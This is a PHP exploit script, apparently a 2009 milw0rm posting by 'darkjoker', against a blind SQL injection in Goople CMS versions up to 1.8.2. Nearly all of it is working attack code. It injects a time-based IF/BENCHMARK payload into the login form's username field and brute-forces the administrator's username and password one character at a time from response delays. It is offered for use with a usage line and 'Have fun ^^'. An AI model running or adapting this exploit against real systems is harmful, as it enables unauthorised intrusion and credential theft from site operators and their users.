#--+++=========================================================+++--#
#--+++====== Goople <= 1.8.2 Blind SQL Injection Exploit ======+++--#
#--+++=========================================================+++--#

#!/usr/bin/php
<?

function usage ()
{
	echo
		"\n[+] Goople <= 1.8.2 Blind SQL Injection Exploit".
		"\n[+] Author: darkjoker".
		"\n[+] Site  : http://darkjoker.net23.net".
		"\n[+] Usage : php xpl.php <hostname> <path> [key]".
		"\n[+] Ex.   : php xpl.php localhost /goople abcdefghijklmnopqrstuvwxyz".
		"\n[+] Note  : Have fun ^^\n\n";
	exit ();
}

function check ($hostname, $path, $field, $pos, $char)
{
	$char = ord ($char);
	$fp = fsockopen ($hostname, 80);
	$usr = "username=1' OR IF((ASCII(SUBSTRING((SELECT {$field} FROM GoopleCMS_users_ WHERE id =1),{$pos},1))={$char})".
	       ",BENCHMARK(200000000,CHAR(0)),0) OR '1' = '2";
	$usr = str_replace ("'", "%27", $usr);
	$usr = str_replace (" ", "%20", $usr);
	$pwd = "password=asd";
	$sub = "loginsubmit=loginsubmit&loginsubmit=Login";
	$str = "{$usr}&{$pwd}&{$sub}";
	$post = "POST {$path}/frontpage.php HTTP/1.1\r\n".
		"Host: {$hostname}\r\n".
		"Connection: Close\r\n".
		"Content-Type: application/x-www-form-urlencoded\r\n".
		"Content-Length: " . strlen ($str) . "\r\n\r\n".
		$str;
	
	fputs ($fp, $post);
	$a =  time ();
	while (!feof ($fp))
		$res .= fgets ($fp, 1024);

	$b =  time ();
	fclose ($fp);

	if ($b - $a > 4)
		return true;
	else
		return false;
}


function brute ($hostname, $path, $field, $key)
{
	$pos = 1;
	$chr = 0;
	while ($chr < strlen ($key))
	{
		if (check ($hostname, $path, $field, $pos, $key [$chr]))
		{
			echo $key [$chr];
			$chr = -1;
			$pos++;
		}
		$chr++;
	}
}


if (count ($argv) != 3)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$key = $argv [3];
if (empty ($key))
	$key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

echo "[+] Username: ";
brute ($hostname, $path, "username", $key);
echo "\n[+] Password: ";
brute ($hostname, $path, "password", $key);
echo "\n";

?>

# milw0rm.com [2009-01-06]